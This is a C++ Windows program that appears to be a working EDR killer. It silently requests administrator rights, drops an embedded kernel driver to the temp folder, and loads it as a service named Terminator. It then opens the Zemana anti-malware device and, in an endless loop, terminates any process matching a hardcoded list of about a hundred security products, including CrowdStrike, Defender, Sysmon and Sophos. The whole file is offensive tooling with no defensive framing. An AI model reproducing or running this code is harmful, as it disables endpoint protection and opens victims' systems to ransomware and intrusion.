#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <tlhelp32.h>
#include <fstream>

#define IOCTL_REGISTER_PROCESS 0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048
#define IDR_SYSFILE 101

const char* g_serviceName = "Terminator";
const char* const g_edrlist[] = {
	"activeconsole", "anti malware",    "anti-malware",
	"antimalware",   "anti virus",      "anti-virus",
	"antivirus",     "appsense",        "authtap",
	"avast",         "avecto",          "canary",
	"carbonblack",   "carbon black",    "cb.exe",
	"ciscoamp",      "cisco amp",       "countercept",
	"countertack",   "cramtray",        "crssvc",
	"crowdstrike",   "csagent",         "csfalcon",
	"csshell",       "cybereason",      "cyclorama",
	"cylance",       "cyoptics",        "cyupdate",
	"cyvera",        "cyserver",        "cytray",
	"darktrace",     "defendpoint",     "defender",
	"eectrl",        "elastic",         "endgame",
	"f-secure",      "forcepoint",      "fireeye",
	"groundling",    "GRRservic",       "inspector",
	"ivanti",        "kaspersky",       "lacuna",
	"logrhythm",     "malware",         "mandiant",
	"mcafee",        "morphisec",       "msascuil",
	"msmpeng",       "nissrv",          "omni",
	"omniagent",     "osquery",         "palo alto networks",
	"pgeposervice",  "pgsystemtray",    "privilegeguard",
	"procwall",      "protectorservic", "qradar",
	"redcloak",      "secureworks",     "securityhealthservice",
	"semlaunchsv",   "sentinel",        "sepliveupdat",
	"sisidsservice", "sisipsservice",   "sisipsutil",
	"smc.exe",       "smcgui",          "snac64",
	"sophos",        "splunk",          "srtsp",
	"symantec",      "symcorpu",        "symefasi",
	"sysinternal",   "sysmon",          "tanium",
	"tda.exe",       "tdawork",         "tpython",
	"vectra",        "wincollect",      "windowssensor",
	"wireshark",     "threat",          "xagt.exe",
	"xagtnotif.exe" ,"mssense" };
int g_edrlistSize = sizeof(g_edrlist) / sizeof(g_edrlist[0]);

BOOL IsRunningAsAdmin() {
    BOOL isAdmin = FALSE;
    PSID administratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&ntAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &administratorsGroup)) {
        CheckTokenMembership(NULL, administratorsGroup, &isAdmin);
        FreeSid(administratorsGroup);
    }
    return isAdmin;
}

void RequestAdminPrivileges() {
    char szPath[MAX_PATH];
    GetModuleFileNameA(NULL, szPath, MAX_PATH);
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb = "runas";
    sei.lpFile = szPath;
    sei.hwnd = NULL;
    sei.nShow = SW_HIDE;
    if (!ShellExecuteExA(&sei)) {
        exit(1);
    }
    exit(0);
}

BOOL DeleteExistingService(SC_HANDLE hService) {
    SERVICE_STATUS serviceStatus = {};
    if (!QueryServiceStatus(hService, &serviceStatus)) {
        return FALSE;
    }
    if (serviceStatus.dwCurrentState != SERVICE_STOPPED) {
        if (!ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
            return FALSE;
        }
    }
    if (!DeleteService(hService)) {
        return FALSE;
    }
    return TRUE;
}

BOOL loadDriver(char* driverPath) {
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        return FALSE;
    }
    SC_HANDLE hService = OpenServiceA(hSCM, g_serviceName, SERVICE_ALL_ACCESS);
    if (hService) {
        if (!DeleteExistingService(hService)) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return FALSE;
        }
        CloseServiceHandle(hService);
    }
    hService = CreateServiceA(hSCM, g_serviceName, g_serviceName, SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, driverPath, NULL, NULL, NULL, NULL, NULL);
    if (!hService) {
        CloseServiceHandle(hSCM);
        return FALSE;
    }
    if (!StartServiceA(hService, 0, nullptr)) {
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCM);
        return FALSE;
    }
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return TRUE;
}

char* toLowercase(const char* str) {
    char* lower_str = _strdup(str);
    for (int i = 0; lower_str[i]; i++) lower_str[i] = tolower((unsigned char)lower_str[i]);
    return lower_str;
}

int isInEdrlist(const char* pn) {
    char* tempv = toLowercase(pn);
    for (int i = 0; i < g_edrlistSize; i++) {
        if (strstr(tempv, g_edrlist[i])) {
            free(tempv);
            return 1;
        }
    }
    free(tempv);
    return 0;
}

DWORD checkEDRProcesses(HANDLE hDevice) {
    unsigned int procId = 0, pOutbuff = 0;
    DWORD bytesRet = 0;
    int ecount = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pE;
        pE.dwSize = sizeof(pE);
        if (Process32First(hSnap, &pE)) {
            do {
                if (isInEdrlist(pE.szExeFile)) {
                    procId = (unsigned int)pE.th32ProcessID;
                    DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &procId, sizeof(procId), &pOutbuff, sizeof(pOutbuff), &bytesRet, NULL);
                    ecount++;
                }
            } while (Process32Next(hSnap, &pE));
        }
        CloseHandle(hSnap);
    }
    return ecount;
}

BOOL ExtractSysFile(const char* outputPath) {
    HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_SYSFILE), "SYS_FILE");
    if (!hRes) return FALSE;
    HGLOBAL hLoadedRes = LoadResource(NULL, hRes);
    if (!hLoadedRes) return FALSE;
    DWORD sysSize = SizeofResource(NULL, hRes);
    void* pSysData = LockResource(hLoadedRes);
    if (!pSysData || sysSize == 0) return FALSE;
    std::ofstream sysFile(outputPath, std::ios::binary);
    if (!sysFile.is_open()) return FALSE;
    sysFile.write(reinterpret_cast<char*>(pSysData), sysSize);
    sysFile.close();
    return TRUE;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    if (!IsRunningAsAdmin()) {
        RequestAdminPrivileges();
    }

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    strcat(tempPath, "Terminator.sys");

    if (!ExtractSysFile(tempPath)) {
        return -1;
    }

    if (!loadDriver(tempPath)) {
        return -1;
    }

    HANDLE hDevice = CreateFileA("\\\\.\\ZemanaAntiMalware", GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        return -1;
    }

    unsigned int input = GetCurrentProcessId();
    if (!DeviceIoControl(hDevice, IOCTL_REGISTER_PROCESS, &input, sizeof(input), NULL, 0, NULL, NULL)) {
        CloseHandle(hDevice);
        return -1;
    }

    while (true) {
        checkEDRProcesses(hDevice);
        Sleep(5000);
    }

    CloseHandle(hDevice);
    return 0;
}
